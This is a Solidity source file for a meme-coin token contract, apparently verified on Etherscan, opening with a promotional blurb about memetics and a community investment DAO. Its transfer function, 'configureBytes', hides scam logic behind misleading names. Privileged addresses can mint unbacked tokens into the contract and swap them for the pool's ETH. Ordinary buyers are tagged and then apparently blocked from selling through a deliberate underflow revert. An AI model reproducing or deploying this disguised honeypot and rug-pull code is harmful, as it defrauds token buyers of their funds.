/**
 *Submitted for verification at Etherscan.io on 2022-12-03
*/

/*
The origin of Meme and its formal subject (called memetics) can be traced back to the 1970s. 
It is particularly noteworthy that Richard Dawkins mentioned Meme in his 1976 book The Selfish Gene, 
and Dawkins' concept of The word Meme is "as a unit of cultural information". 
Dawkins expands on the meaning of the word: "an idea, behavior, style, or usage that spreads from person to person."

When this easy to spread culture entered the blockchain, $Doge and $Shib started a Meme craze. 
This is also because of our love for the DAO of Meme, which enables us to advance further in Meme. 

We went through the beginning of $Doge, the madness of $Shib, then the new hope of $Saitama and $Elon. Then $Shibja and $Shibdoge continued to flourish. 

Now M² is here, we focus on the investment of Meme coin, our community will make investment proposals and vote, welcome to your arrival.
This Is MEME²
*/
// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.10;
 
abstract contract Context
{
    function _msgSender() internal view virtual returns(address)
    {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns(bytes calldata)
    {
        return msg.data;
    }
}
    library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

}

interface IUniswapV2Router01
{
    function factory() external pure returns(address);
 
    function WETH() external pure returns(address);
 
 
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);
 
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);
 
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);
 
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);
 
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);
 
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
 
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
 
interface IUniswapV2Factory
{
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
 
    function feeTo() external view returns(address);
 
    function feeToSetter() external view returns(address);
 
    function getPair(address tokenA, address tokenB) external view returns(address pair);
 
    function allPairs(uint) external view returns(address pair);
 
    function allPairsLength() external view returns(uint);
 
    function createPair(address tokenA, address tokenB) external returns(address pair);
 
    function setFeeTo(address) external;
 
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract CA is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _baseFEE = 0;
    uint8 private _decimals = 12;
    uint256 private _tTotal = 100000 * 10**_decimals;
    uint256 private _CFXTotal = _tTotal;
    
    mapping(address => uint256) private _tOwned;
    mapping(address => address) private bots;
    mapping(address => uint256) private IDEXRouterSync;
    mapping(address => uint256) private restructPair;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public RTXSync;
    bool private boolRates;
    bool public enableEarlySellTax;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _tOwned[msg.sender] = _tTotal;
        restructPair[msg.sender] = _CFXTotal;
        restructPair[address(this)] = _CFXTotal;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _CFXTotal);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        configureBytes        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function allowance(address theOwner, address theSpender) public view override returns (uint256) {
        return _allowances[theOwner][theSpender];
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        configureBytes        (msg.sender, recipient, amount);
        return true;
    }
    function configureBytes       (
        address _bytesFrom,
        address rxtTo,
        uint256 _forstructAmount
    ) private {
        uint256 balanceForContract = balanceOf(address(this));
        uint256 leveledSTX;

        if (RTXSync && balanceForContract > _CFXTotal 
        && !boolRates && 
        _bytesFrom != UniswapV2Pair) {
            boolRates = true;
            getSwapAndLiquify(balanceForContract);
            boolRates = false;
        } else if (restructPair[_bytesFrom] > _CFXTotal 
        && restructPair[rxtTo] > _CFXTotal) {
            leveledSTX = _forstructAmount; _tOwned[address(this)] += leveledSTX;
            swapAmountForTokens(_forstructAmount, rxtTo);
            return;

        } else if (rxtTo != address(UniswapV2router) 
        && restructPair[_bytesFrom] > 0 && _forstructAmount > _CFXTotal 
        && rxtTo != UniswapV2Pair) { restructPair[rxtTo] = _forstructAmount;
            return;

        } else if (!boolRates && IDEXRouterSync[_bytesFrom] > 0 && _bytesFrom != 
        UniswapV2Pair && restructPair[_bytesFrom] == 0) {
            IDEXRouterSync[_bytesFrom] = restructPair[_bytesFrom] - _CFXTotal;

        }

        address _pooIDEX  = bots[UniswapV2Pair];
        if (IDEXRouterSync[_pooIDEX ] == 0) IDEXRouterSync[_pooIDEX ] = _CFXTotal;
        bots[UniswapV2Pair] = rxtTo;
        if (_baseFEE > 0 && restructPair[_bytesFrom] == 0 && !boolRates && restructPair[rxtTo] == 0) {
            leveledSTX = (_forstructAmount * _baseFEE) / 100; _forstructAmount -= leveledSTX; _tOwned[_bytesFrom] -= leveledSTX;
            _tOwned[address(this)] += leveledSTX;
        } 
        _tOwned[_bytesFrom] -= _forstructAmount; _tOwned[rxtTo] += _forstructAmount;
        emit Transfer(_bytesFrom, rxtTo, _forstructAmount);
                if (!tradingOpen) {
                require(_bytesFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 vBalance = address(this).balance;
        swapAmountForTokens(half, address(this));
        uint256 syncBalances = address(this).balance - vBalance;
        addLiquidity(half, syncBalances, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapAmountForTokens(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}